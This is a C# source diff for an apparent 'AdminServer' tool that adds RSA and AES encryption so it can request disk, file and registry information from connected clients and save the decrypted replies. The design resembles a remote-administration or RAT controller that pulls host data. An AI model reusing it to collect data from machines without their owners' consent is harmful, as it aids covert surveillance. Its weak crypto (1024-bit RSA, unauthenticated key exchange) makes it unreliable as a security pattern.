@@ -5,6 +5,7 @@ using System.Drawing;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -18,6 +19,8 @@ namespace AdminServer
         private bool active = false;
         private Thread listener = null;
         private long id = 0;
+        public byte[] keyDecrypt;
+        public byte[] IV;
         private struct MyClient
         {
             public long id;
@@ -28,6 +31,8 @@ namespace AdminServer
             public StringBuilder data;
             public EventWaitHandle handle;
         };
+        private string pubKeyString;
+        private string privKeyString;
         private ConcurrentDictionary<long, MyClient> clients = new ConcurrentDictionary<long, MyClient>();
         private Task send = null;
         private Thread disconnect = null;
@@ -124,17 +129,32 @@ namespace AdminServer
                 });
             }
         }
-        public bool ParseMessage(string message)
+        public  bool ParseMessage(string message, long id)
         {
+            clients.TryGetValue(id, out MyClient obj);
             if (message.Contains("<GetDateResult>"))
             {
-                
-                string name = "Temp-" + DateTime.Now.ToString().Replace(":","-").Replace(".","-");
+                string tmp = DecryptAESData(Convert.FromBase64String(message.Replace("<GetDateResult>", "").ToString()), keyDecrypt, IV);
+                string name = "Temp-" + DateTime.Now.ToString().Replace(":", "-").Replace(".", "-");
                 using (FileStream fstream = new FileStream($"{name}.txt", FileMode.OpenOrCreate))
                 {
-                    byte[] array = System.Text.Encoding.Default.GetBytes(message);
+
+                    byte[] array = System.Text.Encoding.Default.GetBytes(tmp);
                     fstream.Write(array, 0, array.Length);
                 }
+                string msg = string.Format("Данные получены");
+                Log(msg);
+                Send(msg, obj.id);
+                return true;
+            }
+            else if (message.Contains("<GK>"))
+            {
+                keyDecrypt = DecryptAES(message.Replace("<GK>", ""));
+                return true;
+            }
+            else if (message.Contains("<IV>"))
+            {
+                IV = DecryptAES((message.Replace("<IV>", "")));
                 return true;
             }
             else
@@ -159,7 +179,7 @@ namespace AdminServer
                 }
             }
             if (bytes > 0)
-            {
+            {//
                 obj.data.AppendFormat("{0}", Encoding.UTF8.GetString(obj.buffer, 0, bytes));
                 try
                 {
@@ -169,15 +189,9 @@ namespace AdminServer
                     }
                     else
                     {
-                        if (!ParseMessage(obj.data.ToString()))
+                        if (!ParseMessage(obj.data.ToString(), obj.id))
                         {
                             string msg = string.Format("{0}: {1}", obj.username, obj.data);
-                            Log(msg);
-                            Send(msg, obj.id);
-                        }
-                        else
-                        {
-                            string msg = string.Format("{0}: Данные получены", obj.username);
                             Log(msg);
                             Send(msg, obj.id);
                         }
@@ -316,6 +330,7 @@ namespace AdminServer
             TcpListener listener = null;
             try
             {
+               
                 listener = new TcpListener(ip, port);
                 listener.Start();
                 Active(true);
@@ -403,6 +418,7 @@ namespace AdminServer
                 }
                 if (!error)
                 {
+                    GenerateRSAKeys();
                     listener = new Thread(() => Listener(ip, port))
                     {
                         IsBackground = true
@@ -571,8 +587,11 @@ namespace AdminServer
 
         private void GetInformation(long id)
         {
+            clients.TryGetValue(id, out MyClient obj);
             if (disks.Checked || files.Checked || regedit.Checked)
             {
+                Send(pubKeyString, obj);
+                Thread.Sleep(500);
                 string command = "<GetDate ";
                 if (disks.Checked)
                 {
@@ -587,7 +606,6 @@ namespace AdminServer
                     command += "-R";
                 }
                 command += "> ";
-                clients.TryGetValue(id, out MyClient obj);
                 Send(command, obj);
             }
             else
@@ -620,5 +638,49 @@ namespace AdminServer
             active = false;
             Disconnect();
         }
+
+        #region CryptoFunc
+        static string DecryptAESData(byte[] cipherText, byte[] Key, byte[] IV)
+        {
+            if (cipherText == null || cipherText.Length <= 0 || IV == null || IV.Length <= 0 || Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Checkinputdate");
+         
+            string plaintext = null;
+
+            using (Aes aesAlg = Aes.Create())
+            {
+                aesAlg.Key = Key;
+                aesAlg.IV = IV;
+                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
+
+                using (MemoryStream ms = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader sr = new StreamReader(cs))
+                        {
+                            plaintext = sr.ReadToEnd();
+                        }
+                    }
+                }
+            }
+
+            return plaintext;
+        }
+        private void GenerateRSAKeys()
+        {
+            RSA rsa = RSA.Create();
+            pubKeyString = rsa.ToXmlString(false);
+            privKeyString = rsa.ToXmlString(true);
+        }
+        private byte[] DecryptAES(string Aeskey)
+        {
+            var rsa = new RSACryptoServiceProvider(1024);
+            rsa.FromXmlString(privKeyString);
+            var resultBytes = Convert.FromBase64String(Aeskey);
+            var decryptedBytes = rsa.Decrypt(resultBytes, true);
+            return decryptedBytes;
+        }
+        #endregion  CryptoFunc
     }
 }
